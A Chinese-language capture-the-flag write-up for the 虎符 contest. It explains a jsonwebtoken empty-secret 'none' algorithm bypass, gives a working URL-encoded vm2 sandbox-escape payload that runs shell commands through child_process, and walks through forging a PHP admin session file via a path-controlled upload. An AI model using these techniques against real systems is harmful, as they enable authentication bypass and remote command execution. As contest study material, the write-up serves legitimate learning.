# 虎符

## Web1

利用点:

>``jsonwebtoken``库缺陷
>
>当用户传入``jwt secret``为空时``jsonwebtoken``会采用``algorithm none``进行解密

/package.json 显示使用了koa

koa.session中有用户名信息，存在签名验证

app.js中有注释

```js
    /**
     *  或许该用 koa-static 来处理静态文件
     *  路径该怎么配置？不管了先填个根目录XD
     */
    
    function login() {
        const username = $("#username").val();
        const password = $("#password").val();
        const token = sessionStorage.getItem("token");
        $.post("/api/login", {username, password, authorization:token})
            .done(function(data) {
                const {status} = data;
                if(status) {
                    document.location = "/home";
                }
            })
            .fail(function(xhr, textStatus, errorThrown) {
                alert(xhr.responseJSON.message);
            });
    }
    
    function register() {
        const username = $("#username").val();
        const password = $("#password").val();
        $.post("/api/register", {username, password})
            .done(function(data) {
                const { token } = data;
                sessionStorage.setItem('token', token);
                document.location = "/login";
            })
            .fail(function(xhr, textStatus, errorThrown) {
                alert(xhr.responseJSON.message);
            });
    }
    
    function logout() {
        $.get('/api/logout').done(function(data) {
            const {status} = data;
            if(status) {
                document.location = '/login';
            }
        });
    }
    
    function getflag() {
        $.get('/api/flag').done(function(data) {
            const {flag} = data;
            $("#username").val(flag);
        }).fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
    }
```
注释提示了``/controllers/api.js``源码泄露

```js
const crypto = require('crypto');
const fs = require('fs')
const jwt = require('jsonwebtoken')

const APIError = require('../rest').APIError;

module.exports = {
    'POST /api/register': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || username === 'admin'){
            throw new APIError('register error', 'wrong username');
        }

        if(global.secrets.length > 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString('hex');
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});//应该是algorithms

        ctx.rest({
            token: token
        });

        await next();
    },

    'POST /api/login': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError('login error', 'username or password is necessary');
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
            throw new APIError('login error', 'no such secret id');
        }

        const secret = global.secrets[sid];//令sid为不存在值使得secret=none

        const user = jwt.verify(token, secret, {algorithm: 'HS256'});//如果token中的加密方法为空那么{algorithm: 'HS256'}不生效

        const status = username === user.username && password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    'GET /api/flag': async (ctx, next) => {
        if(ctx.session.username !== 'admin'){
            throw new APIError('permission error', 'permission denied');
        }

        const flag = fs.readFileSync('/flag').toString();
        ctx.rest({
            flag
        });

        await next();
    },

    'GET /api/logout': async (ctx, next) => {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
```

## Web2

nodejs的rce fuzz方法

``Object.getOwnPropertyNames(this)`` 得到依赖包名

``Error().stack`` 抛出栈错误

这里是vm2的一个逃逸payload，然而当时并不知道urlencode和数组可以绕过。。。。

随便到github上找个payload

```
http://14e25396-8547-4c6c-8a05-b28adf35624b.node3.buuoj.cn/run.php?code[]=try%20{%20require(%27child_process%27).execSync(%22idea%22)%20}%20catch(e){}let%20buffer%20=%20{hexSlice:%20()%20=%3E%20%22%22,magic:%20{get%20[Symbol.for(%22nodejs.util.inspect.custom%22)](){throw%20f%20=%3E%20f.constructor(%22return%20process%22)();}}};try{Buffer.prototype.inspect.call(buffer,%200,%20{%20customInspect:%20true%20});}catch(e){e(()=%3E0).mainModule.require(%27child_process%27).execSync(%22cat%20/flag%22)}
```

## Web3

直接给了源码

```php
<?php
error_reporting(0);
session_save_path("/var/babyctf/"); //更换session存储路径
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest';
}
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr');
$dir_path = "/var/babyctf/".$attr;//attr可控，意味着可以读写根目录下的session
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];//这里路径可控
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e->getMessage();
    }
} elseif ($direction === "download") {
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e->getMessage();
    }
    exit;
}
?>
```
拿到session内容

```
usernames:5:"guest";
```

然后就可以根据格式伪造session了

可以判断这里采用的php序列化器是``php_binary``

生成一个

```php
<?php
ini_set('session.serialize_handler', 'php_binary');
session_save_path(".");
session_start();

$_SESSION['username'] = 'admin';
```

然后得到这个``session``的文件名

```
php -r "echo hash_file('sha256', 'sess');"
```

```
sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4
```

使用这个session然后创建一个``/success.txt/``目录就行

>file_exists ( string $filename ) : bool
>检查文件或目录是否存在。

PS:Postman真好用

## Misc1

用取证大师可以看到邮件来往记录，然后根据浏览器记录可以看出前部分使用了codemoji,最后提示了realname，比赛的时候一直没找到，最后发现在手机数据的通讯录里

然后phpstudy的博客，和其他邮件的emojiaes key都可以解了


## 参考链接

https://www.zhaoj.in/read-6512.html